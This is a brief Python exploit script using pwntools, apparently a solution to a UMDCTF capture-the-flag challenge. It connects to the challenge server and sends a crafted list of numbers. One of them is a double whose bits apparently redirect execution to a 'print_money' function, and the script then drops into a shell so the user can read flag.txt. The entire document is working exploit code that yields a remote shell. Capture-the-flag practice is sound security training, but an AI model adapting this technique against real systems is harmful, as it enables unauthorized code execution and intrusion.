#!/usr/bin/env python3
from pwn import *
r = remote('challs.umdctf.io', 31005)

payload  = b'0 0 0 0 0 0 4.8678447495872505e-270\n'
r.recvuntil(b'Enter your lucky numbers:')
r.send(payload)

# print_money drops us in a shell
r.interactive()          # type  cat flag.txt
